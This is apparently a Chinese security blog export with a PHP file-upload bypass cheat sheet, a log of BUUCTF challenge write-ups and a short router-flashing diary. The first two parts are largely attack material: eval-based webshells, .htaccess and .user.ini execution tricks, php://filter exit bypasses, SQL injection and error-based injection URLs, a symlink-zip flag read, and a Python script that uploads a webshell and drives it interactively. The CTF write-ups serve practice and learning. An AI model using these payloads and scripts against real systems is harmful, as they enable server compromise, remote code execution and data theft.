正则匹配设置SCRIPT_FILENAME。当访问www.xxx.com/phpinfo.jpg/1.php这个 URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成 SCRIPT_FILENAME传递给PHP CGI。 原因是开启了 fix_pathinfo 这个选项，会触发 在PHP中的如下逻辑： PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会 将phpinfo.jpg作为PHP文件来解析了。 形式： www.xxxx.com/UploadFiles/image/1.jpg/1.php www.xxxx.com/UploadFiles/image/1.jpg%00.php www.xxxx.com/UploadFiles/image/1.jpg/%20\\0.php 另一种方法：上传一个名字为test.jpg，然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。 0x04 文件上传-内容检测 | 这文件要是有长有短，我直接吃了它1.magic number | 你不劈开这文件咋知道它熟不熟啊 magic number，它可以用来标记文件或者协议的格式，很多文件都有幻数标志来表明该文件的格式。 1234GIF89a(...some binary data for image...)&lt;?php phpinfo(); ?&gt;(... skipping the rest of binary data ...) 2.过滤&lt;?以及php @eval($_POST[cmd]); //需要php.ini开启短标签 3.正则替换老生常谈，双写 or 其他 4.二次渲染 | 你TM劈我文件是吧对渲染/加载测试的攻击方式是代码注入绕过。使用winhex在不破坏文件本身的渲染情况下找一个空白区进行填充代码，一般为图片的注释区。对二次渲染的攻击方式就是攻击文件加载器自身 0x05文件上传-配置文件 | 看，吸铁石.htaccess只是适用于apache，如果变成niginx或者iis则不会被解析文件上传漏洞之.htaccess .htaccess文件（“分布式配置文件”）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令将受到限制。管理员可以通过Apache的AllowOverride指令来设置。 具体实现： 1、上传.htaccess文件至服务器上传目录，此时apache在解析该目录下的php时将按照文件要求。只要文件名匹配到所定义的字符串，就会将该文件当作php解析。 123&lt;FilesMatch &quot;shana&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 2、上传.htaccess文件设置的关键字的文件名，即上传一个黑名单没有过滤的随意后缀名文件，但文件名中一定要包含shana，如”shana.jpg”，内容为一句话木马。此时”shana.jpg”会被Apache当作php解析。 .user.ini很通用 1234//.user.iniGIF89aauto_prepend_file=xxx 会自动包含xxx 系统特性仅适用windows平台windows 系统会自动删 源码一开天地灭，选择视窗保平安 0x06 文件上传-条件竞争 | 你是故意来找猹？文件能传，但是传进去后就给你删了，通常情况下需要一边传一边访问,或者利用环境，让php迟一点删文件 0x07 文件上传-解压报错 | 你这压缩包是金子做的还是文件是金子做的这种情况要求比较高了，需要后端解压压缩包Dest0g3 520迎新赛 ezip原理:创建一个解压到一半会报错的文件，然后遗留shell文件getshell 0x08 文件上传-软连接传快捷方式进去，离谱 要求后端会解压文件 ln -s /flag flag zip -y flag.zip flag 0x09 文件上传-死亡exit | TMD刁民，敢杀我的马？情况一 file_put_contents($filename,”&lt;?php exit();”.$content);编码绕过,base64 rot13 balabalafilename=php://filter/convert.base64-decode/resource=shell.php 或者写到.htaccess 12filename=php://filter/write=string.strip_tags/resource=.htaccesscontent=?&gt;php_value auto_prepend_file flag.php 情况二 file_put_contents($content,”&lt;?php exit();”.$content);rot13content=php://filter/string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=shell.php二次编码 123456789101112&lt;?php $char = 'r'; #构造r的二次编码 for ($ascii1 = 0; $ascii1 &lt; 256; $ascii1++) { for ($ascii2 = 0; $ascii2 &lt; 256; $ascii2++) { $aaa = '%'.$ascii1.'%'.$ascii2; if(urldecode(urldecode($aaa)) == $char){ echo $char.': '.$aaa; echo &quot;\\n&quot;; } } } ?&gt; 过滤器嵌套content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=shell.php base64编码content=php://filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+/../shell.php 第三种情况 file_put_contents($content,”“.\\nxxxxx);`` NaN upload-exp 这里放一些常用的文件上传，会继续更新1.前端文件上传1234&lt;form id=&quot;upload-form&quot; action=&quot;目标网站&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; &gt; &lt;input type=&quot;file&quot; id=&quot;upload_file&quot; name=&quot;upload_file&quot; /&gt; &lt;br /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot; /&gt;&lt;/form&gt; 后端接收代码 123456789101112131415161718if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '文件类型不正确，请重新上传！'; } } else { $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！'; }}?&gt; **注:**前端的&lt;input type=&quot;file&quot; id=&quot;upload_file&quot; name=&quot;upload_file&quot; /&gt;中name=upload_file对应后端代码的$_FILES['upload_file'],前端的&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot; /&gt;中name=&quot;submit&quot;对应后端代码的isset($_POST['submit']),实战环境中还是需要对具体环境进行一些修改 2. .htaccess文件1234567&lt;FilesMatch &quot;shana&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;或者AddType application/x-httpd-php .png 3. .user.ini文件1auto_prepend_file=xxx 鲁棒性非常好，甚至可以 12GIF89aauto_prepend_file=xxx 自动包含xxx Refence:狼组安全团队公开知识库 upload-labs通关攻略文件上传总结文件上传漏洞之.htaccess.user.ini导致文件上传绕过php死亡exit()绕过关于file_put_contents的一些小测试","link":"/2022/10/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%87%E5%BF%98%E5%BD%95/"},{"title":"BUU做题寄录","text":"[suctf 2019]EasySQL | sql_modesql 注入 乍一试，可以堆叠 看样子有过滤,简单测了一下，过滤了from,information 黑名单 1$BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\\&quot;&quot;; 查询语句 1select $_GET['query'] || flag from flag 脑洞:1234payload1: *,1payload2: 0;set sql_mode=PIPES_AS_CONCAT;select 0让sql把 || 当作拼接 [强网杯 2019]随便注 | 堆叠，无select 预编译上来就把黑名单一摆，好像已经无懈可击了 1return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject); 测试一下，字符形 双引号emmm,啥都不会了，只能看看wp了 mysql里面，爆字段并不一定需要information_schema这个库 12345678910mysql&gt; show columns from users;+----------+-------------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+----------+-------------+------+-----+---------+----------------+| id | int(3) | NO | PRI | NULL | auto_increment || username | varchar(20) | NO | | NULL | || password | varchar(20) | NO | | NULL | |+----------+-------------+------+-----+---------+----------------+3 rows in set (0.00 sec) 嗯哼~how 命令查看表中的「字段」，注意表名要用反引号包裹有用 附: MySQL专有无select可用MySQL 除了可以使用 select 查询表中的数据，也可使用 handler 语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler 语句并不具备 select 语句的所有功能。它是 MySQL 专用的语句，并没有包含到SQL标准中。handler 语句提供通往表的直接通道的存储引擎接口，可以用于 MyISAM 和 InnoDB 表。 也可以使用预编译转换成hex绕过 [SUCTF 2019]EasySQL喜提fuzz脚本 12345678910import requests url = &quot;http://7e692c90-6f0b-4aa3-babf-89bb436f6b4f.node4.buuoj.cn:81/&quot;with open('sql-fuzz.txt') as f: for line in f: data = {&quot;query&quot;: line} r = requests.post(url,data=data) if('Nonono' in r.text): print(line.strip(),end=&quot; &quot;) 纯盲注了，啥都看不见，但是我感觉这题的画风是那么的似曾相识….. 1;set sql_mode=PIPES_AS_CONCAT;select 1 淦，上一题一模一样的payload [极客大挑战 2019]LoveSQL报错注入 http://0271ebd9-169b-4d78-8475-f6667e20789c.node4.buuoj.cn:81/check.php?username=admin' and updatexml(0x7e,concat(0x7e,database()),0x7e) %23&amp;password=admin’ and sleep(3) 表名: 12geekuser: id,username,password geek库l0ve1ysq1: id,username,password geek库 admin824fc00cd6f8cd94403b365a80bcfbd cl4ywo_tai_nan_le glzjinglzjin_wants_a_girlfriend Z4cHAr7zCrbiao_ge_dddd_hm 报错注入，硬爆 123http://0271ebd9-169b-4d78-8475-f6667e20789c.node4.buuoj.cn:81/check.php?username=admin' and updatexml(1,concat(0x7e,(select substr((select password from l0ve1ysq1 where username='flag'),30,16)),0x7e),1) %23&amp;password=admin' and sleep(3) [BJDCTF2020]Easy MD5一眼丁真ffifdyop 绕过中一个奇妙的字符串 经过md5加密后：276f722736c95d99e921722cf9ed621c 再转换为字符串：'or'6&lt;乱码&gt; 即 'or'66�]��!r,��b 用途： select * from admin where password=''or'6&lt;乱码&gt;' 就相当于select * from admin where password=''or 1 实现sql注入 [极客大挑战 2019]BuyFlag简单，新手村难度cookie + 传参 +PHP特性 [HCTF 2018]admin[护网杯 2018]easy_tornado随便点了一个文件，发现了这个传参 http://62482047-0242-4246-89d7-23f69a549160.node4.buuoj.cn:81/file?filename=/welcome.txt&amp;filehash=a7b1991d198deda606020048ccd83bee 根据hints.txt发现了md5(cookie_secret+md5(filename)) cookie_secret这玩意到底是个啥，俺不知道，肯定没法破解 不过阴差阳错访问到了这个 http://62482047-0242-4246-89d7-23f69a549160.node4.buuoj.cn:81/error?msg=2 看样子是python沙箱逃逸了,简单fuzz一下，透心凉，心飞扬 搜索一下， http://62482047-0242-4246-89d7-23f69a549160.node4.buuoj.cn:81/error?msg= {'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': '6dcbf553-b18a-46ba-9487-8cf74e2c43ca'} [ACTF2020 新生赛]Upload很好看的前端emmmphtm直接梭 [极客大挑战 2019]RCE ME典中典之 取反?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6); 禁用函数，典中典之UAF脚本,蚁剑直接梭 [NPUCTF2020]ezinclude上来题目意义不明？？？？？右键源代码，还没看明白，F12打开控制台看到小饼干，懂了 flflflflag.php 嗯哼，200状态码的404? bp抓包，只找到一个文件包含的东西，之后就没有思路了…emm偷偷瞄了一眼达不留屁，dir.php果然是开扫吗？，不过buu没法扫了，就假装我扫到了这个文件吧 尝试暴力尝试了好久，发现并没有什么卵用，Php删的比我访问的要快，很头疼，瞄了一眼，发现是string.strip_tags过滤器让Php崩溃就能留下文件 12345678910111213141516171819202122232425262728import requestsimport base64url = &quot;http://7894069c-9a98-4481-bc25-4a3e267ae86d.node4.buuoj.cn:81/flflflflag.php?file=&quot;def get(st): payload = url + st r = requests.get(payload) print(r.ok) #print(type(r.text)) try: print(&quot;[+ base64decode]\\n&quot;,base64.b64decode(r.text[196::][:-38:]).decode()) except Exception as e: print(&quot;[+ not encryption]\\n&quot;,r.text[196::][:-38:])def attack(): file = &quot;&lt;?php eval($_GET['cmd']);?&gt;&quot; filedata = {&quot;file&quot;: file} payload = url + &quot;php://filter/string.strip_tags/resource=/etc/passwd&quot; r = requests.post(url=payload,files=filedata) print (r.ok) r2 = requests.get(url=&quot;http://7894069c-9a98-4481-bc25-4a3e267ae86d.node4.buuoj.cn:81/dir.php&quot;) print (r2.text)attack()while 1 : get(input('&gt;')) 绝了，目录里面东找西找，结果flag在phpinfo里flag{6dc36ed0-9300-43fa-bbae-b85d1b9cbd69} [极客大挑战 2019]BabySQL简单测试一下，双写绕过，简单 数据库名geek 整一个快速判断哪里被替换的trick http://99e1704f-301f-41a7-8754-0231317a4c13.node4.buuoj.cn:81/check.php?username=a&amp;password=admin' ununionion seselectlect 1,database(),(seselectlect &quot;union select 1,group_concat(schema_name),3 from information_schema.schemata&quot;) %23 union select 1,group_concat(schema_name),3 from information_schema.schemata变成了 1,group_concat(schema_name),3 infmation_schema.schemata这里or也被替换了，记得双写一下information里面的or 所以，需要ununionion seselectlect 1,group_concat(schema_name),3 frfromom infoorrmation_schema.schemata 所有库information_schema,mysql,performance_schema,test,ctf,geek 1,group_concat(table_name),3 infmation_schema.tables table_schema='geek' 表名b4bsql,geekuser 字段id,username,password 一番查找没找到数据，然后发现数据是在ctf库里的，寄 [ACTF2020 新生赛]BackupFile没啥东西index.php.bak然后源码就一个弱类型判断 [极客大挑战 2019]Upload文件上传，刚传了俩图片，跟我说不是image，有趣 MIME一改，文件名是phtml，内容是&lt;script language='php'&gt;@eval($_POST[cmd]);&lt;/script&gt; easy http://55facc3d-3d22-4b90-b9c7-f95c9e3f005b.node4.buuoj.cn:81/upload/1.phtml 梭 [ACTF2020 新生赛]Upload[MRCTF2020]Ez_bypass简单，先是md5然后是is_numberic绕过，太简单了 [网鼎杯 2020 青龙组]AreUSerialz[网鼎杯 2020 朱雀组]phpwebfile_get_content直接读源码 123456789101112131415161718192021222324252627282930&lt;?php $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;); function gettime($func, $p) { $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) { return $result; } else {return &quot;&quot;;} } class Test { var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() { if ($this-&gt;func != &quot;&quot;) { echo gettime($this-&gt;func, $this-&gt;p); } } } $func = $_REQUEST[&quot;func&quot;]; $p = $_REQUEST[&quot;p&quot;]; if ($func != null) { $func = strtolower($func); if (!in_array($func,$disable_fun)) { echo gettime($func, $p); }else { die(&quot;Hacker...&quot;); } } ?&gt; 命名空间绕过数组之后，没有权限写shell，太难受了,不知道flag被藏在了哪里，上bp扫一下吧 flag在/tmp下面flag{68a63dcd-6a3a-4a8c-bedb-7c15377fef29} [BSidesCF 2020]Had a bad day以为是sql注入，打了个'后发现是文件包含 1234Warning: include(woofers'.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 37Warning: include(): Failed opening 'woofers'.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 37 包含index.php 12345678910111213&lt;?php $file = $_GET['category']; if(isset($file)) { if( strpos( $file, &quot;woofers&quot; ) !== false || strpos( $file, &quot;meowers&quot; ) !== false || strpos( $file, &quot;index&quot;)){ include ($file . '.php'); } else{ echo &quot;Sorry, we currently only support woofers and meowers.&quot;; } } ?&gt; PHP的文件包含,太简单了 php://filter/convert.base64-encode/resource=index/../flag [BJDCTF2020]Cookie is so stable用户名写到cookie里面，emm，貌似是ssti?但是过滤很严 留着之后写 [强网杯 2019]高明的黑客上来就送源码,666 我尼玛，几百个文件不会，过，之后做 SSRF me屎一样的一行代码，我吐了，找个美化后的代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#! /usr/bin/env python# #encoding=utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding('latin1') app = Flask(__name__) secert_key = os.urandom(16) class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): os.mkdir(self.sandbox) def Exec(self): result = {} result['code'] = 500 if (self.checkSign()): if &quot;scan&quot; in self.action: tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, 'w') resp = scan(self.param) if (resp == &quot;Connection Timeout&quot;): result['data'] = resp else: print resp tmpfile.write(resp) tmpfile.close() result['code'] = 200 if &quot;read&quot; in self.action: f = open(&quot;./%s/result.txt&quot; % self.sandbox, 'r') result['code'] = 200 result['data'] = f.read() if result['code'] == 500: result['data'] = &quot;Action Error&quot; else: result['code'] = 500 result['msg'] = &quot;Sign Error&quot; return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False @app.route(&quot;/geneSign&quot;, methods=['GET', 'POST'])def geneSign(): param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) action = &quot;scan&quot; return getSign(action, param) @app.route('/De1ta',methods=['GET','POST'])def challenge(): action = urllib.unquote(request.cookies.get(&quot;action&quot;)) param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) sign = urllib.unquote(request.cookies.get(&quot;sign&quot;)) ip = request.remote_addr if(waf(param)): return &quot;No Hacker!!!!&quot; task = Task(action, param, sign, ip) return json.dumps(task.Exec()) @app.route('/')def index(): return open(&quot;code.txt&quot;,&quot;r&quot;).read() def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return &quot;Connection Timeout&quot; def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() def md5(content): return hashlib.md5(content).hexdigest() def waf(param): check=param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return Falseif __name__ == '__main__': app.debug = False app.run(host='0.0.0.0',port=9999) 剩着等会写 [NCTF 2018]滴!晨跑打卡空格换%0a结尾用%27完事 12345information_schema,cgctf,mysql,performance_schemapcnumberid,bigtime,smalltime,flag 爆列名的时候，不知道咋回事，就是没回显，把cgctf换成十六进制就行了令人疑惑 http://1.14.71.254:28163/index.php?id=114514'%a0union%a0select%a0(select%a0group_concat(flag)%a0from%a0pcnumber),(select%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema='cgctf'),(select%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name=0x70636E756D626572%a0limit%a01,1),4%a0%27 [ZJCTF 2019]NiZhuanSiWei建个小站，http发现连不上emmmmdata伪协议进去了data://text//plain;base64,d2VsY29tZSB0byB0aGUgempjdGY= 提示useless.php 1234567891011121314&lt;?php class Flag{ //flag.php public $file; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); } } } ?&gt; 直接拔出来,很明显，反序列化 easy [HCTF 2018]WarmUpCVE-2018-12613 关键在mb_strpos($_page . '?', '?')导致真正读取的是最后一个?后面的文件，但是检查的时候只检查访问前面的文件，导致可以?file=hint.php?../../../../../../ffffllllaaaagggg绕过 [极客大挑战 2019]HardSQL报错注入updatexml，禁用空格直接用()，直接注进去了 [RoarCTF 2019]Easy Calc这题waf不会过，麻了,加个空格就可以了，撅了 后面绕过单双引号就直接用chr函数拼接了 [BJDCTF2020]EzPHP访问源代码看到了base64 1nD3x.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354 &lt;?phphighlight_file(__FILE__);error_reporting(0); $file = &quot;1nD3x.php&quot;;$shana = $_GET['shana'];$passwd = $_GET['passwd'];$arg = '';$code = '';echo &quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;;if($_SERVER) { if ( preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\&quot;|\\'|log/i', $_SERVER['QUERY_STRING']) ) die('You seem to want to do something bad?'); }if (!preg_match('/http|https/i', $_GET['file'])) { if (preg_match('/^aqua_is_cute$/', $_GET['debu']) &amp;&amp; $_GET['debu'] !== 'aqua_is_cute') { $file = $_GET[&quot;file&quot;]; echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;; } } else die('fxck you! What do you want to do ?!');if($_REQUEST) { foreach($_REQUEST as $value) { if(preg_match('/[a-zA-Z]/i', $value)) die('fxck you! I hate English!'); } } if (file_get_contents($file) !== 'debu_debu_aqua') die(&quot;Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;&quot;);if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd ){ extract($_GET[&quot;flag&quot;]); echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;} else{ die(&quot;fxck you! you don't know my password! And you don't know sha1! why you come here!&quot;);}if(preg_match('/^[a-z0-9]*$/isD', $code) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\&quot;|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i', $arg) ) { die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w=&quot;); } else { include &quot;flag.php&quot;; $code('', $arg); } ?&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!Aqua is the cutest five-year-old child in the world! Isn't it ? 中所周知，easy从不easy，但是细看，还是easy 第一步$_SERVER，这个不会自动URL解码，传参可以直接进行URL编码，绕过第一层正则然后是正则，这个%0a换行绕过就行了然后便是hate English了，在这里有个特性，$_GET[‘a’]=1 $_POST[‘a’]=a 那么$_SERVER[‘a’]返回的是a，当get和post传的变量名义一样的时候，post会把get给覆盖掉，就可以绕过了。 确实easy，几个送分题拼在一起的整理一下 123456789GET:deb%75=aq%75a_is_c%75te%0a&amp;file=data://text/plain,deb%75_deb%75_aq%75a //伪协议&amp;sh%61na[]=1&amp;p%61sswd[]=2POST:debu=1file=1 最后一步,flag写shell [SWPUCTF 2018]SimplePHP进来查看文件?file=随便一试试，嗯哼 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209//file.php&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); include 'function.php'; include 'class.php'; ini_set('open_basedir','/var/www/html/'); $file = $_GET[&quot;file&quot;] ? $_GET['file'] : &quot;&quot;; if(empty($file)) { echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; } $show = new Show(); if(file_exists($file)) { $show-&gt;source = $file; $show-&gt;_show(); } else if (!empty($file)){ die('file doesn\\'t exists.'); } ?&gt;//function.php&lt;?php //show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text/html;charset=utf-8&quot;); error_reporting(0); function upload_file_do() { global $_FILES; $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; //mkdir(&quot;upload&quot;,0777); if(file_exists(&quot;upload/&quot; . $filename)) { unlink($filename); } move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename); echo '&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;'; } function upload_file() { global $_FILES; if(upload_file_check()) { upload_file_do(); } } function upload_file_check() { global $_FILES; $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;); $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]); $extension = end($temp); if(empty($extension)) { //echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; } else{ if(in_array($extension,$allowed_types)) { return true; } else { echo '&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;'; return false; } } } //class.php&lt;?phpclass C1e4r{ public $test; public $str; public function __construct($name) { $this-&gt;str = $name; } public function __destruct() { $this-&gt;test = $this-&gt;str; echo $this-&gt;test; }}class Show{ public $source; public $str; public function __construct($file) { $this-&gt;source = $file; //$this-&gt;source = phar://phar.jpg echo $this-&gt;source; } public function __toString() { $content = $this-&gt;str['str']-&gt;source; return $content; } public function __set($key,$value) { $this-&gt;$key = $value; } public function _show() { if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this-&gt;source)) { die('hacker!'); } else { highlight_file($this-&gt;source); } } public function __wakeup() { if(preg_match(&quot;/http|https|file:|gopher|dict|\\.\\./i&quot;, $this-&gt;source)) { echo &quot;hacker~&quot;; $this-&gt;source = &quot;index.php&quot;; } }}class Test{ public $file; public $params; public function __construct() { $this-&gt;params = array(); } public function __get($key) { return $this-&gt;get($key); } public function get($key) { if(isset($this-&gt;params[$key])) { $value = $this-&gt;params[$key]; } else { $value = &quot;index.php&quot;; } return $this-&gt;file_get($value); } public function file_get($value) { $text = base64_encode(file_get_contents($value)); return $text; }}?&gt;//base.php&lt;?php session_start(); ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;web3&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot;&gt; &lt;script src=&quot;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;nav class=&quot;navbar navbar-default&quot; role=&quot;navigation&quot;&gt; &lt;div class=&quot;container-fluid&quot;&gt; &lt;div class=&quot;navbar-header&quot;&gt; &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;首页&lt;/a&gt; &lt;/div&gt; &lt;ul class=&quot;nav navbar-nav navbra-toggle&quot;&gt; &lt;li class=&quot;active&quot;&gt;&lt;a href=&quot;file.php?file=&quot;&gt;查看文件&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;upload_file.php&quot;&gt;上传文件&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;ul class=&quot;nav navbar-nav navbar-right&quot;&gt; &lt;li&gt;&lt;a href=&quot;index.php&quot;&gt;&lt;span class=&quot;glyphicon glyphicon-user&quot;&gt;&lt;/span&gt;&lt;?php echo $_SERVER['REMOTE_ADDR'];?&gt;&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/nav&gt; &lt;/body&gt; &lt;/html&gt; &lt;!--flag is in f1ag.php--&gt;//index.php&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); include 'base.php';?&gt; //upload_file.php&lt;?php include 'function.php'; upload_file(); ?&gt; &lt;html&gt; &lt;head&gt; &lt;meta charest=&quot;utf-8&quot;&gt; &lt;title&gt;文件上传&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div align = &quot;center&quot;&gt; &lt;h1&gt;前端写得很low,请各位师傅见谅!&lt;/h1&gt; &lt;/div&gt; &lt;style&gt; p{ margin:0 auto} &lt;/style&gt; &lt;div&gt; &lt;form action=&quot;upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;label for=&quot;file&quot;&gt;文件名:&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt; &lt;/div&gt; &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 注释里面都把phar写上去了….phar反序列化没得跑了emmm","link":"/2022/10/10/%E5%81%9A%E9%A2%98%E5%AF%84%E5%BD%95/"},{"title":"折腾路由器日记","text":"起因….闲来无事，刷刷视频，就点到了hak5的网站里面，然后就看到了一个大菠萝 很想要，但是太贵了，但我又想玩，一通搜索下，找到个好玩的仓库 其实这个大菠萝的固件用的是魔改的openwrt，在翻列表的时候，刚好看到了 诶嘿，刚好家里有个放了好几年的小米WIFI mini 其实本来是想给我的网件R8500刷一个的，关键这玩意连openwrt都没有适配，显然emmmmmm 资料:官方固件下载地址Breed 这里我的小米wifi mini用的是breed-mt7620-xiaomi-mini.binPineapple固件 一路折腾:首先是要开ssh，然后这机器好几年了，我搜的时候搜到了好几种版本的说法，我先是降级到0.8开发板，发现小米wifi绑不上了，然后是一步一步升级，升级之后又给我升成了稳定版，然后又是降级，最后才找到官网的教程不得不说，搜索引擎我还没用明白 其实不需要降级，直接进去,在系统更新那块选择手动升级把这里下载到的开发版固件刷上去就行了。然后打开小米wifi的app，登录自己的小米账号，进去后和路由器进行绑定。设置完成后前往申请一个ssh固件就行了 然后按照网站给的教程一步一步做就行了。 然后我回家的时候没把U盘带回去，我脑子一热，用我的阵列柜了，把分区一屏蔽，然后开个小的FAT32分区，给他刷一下 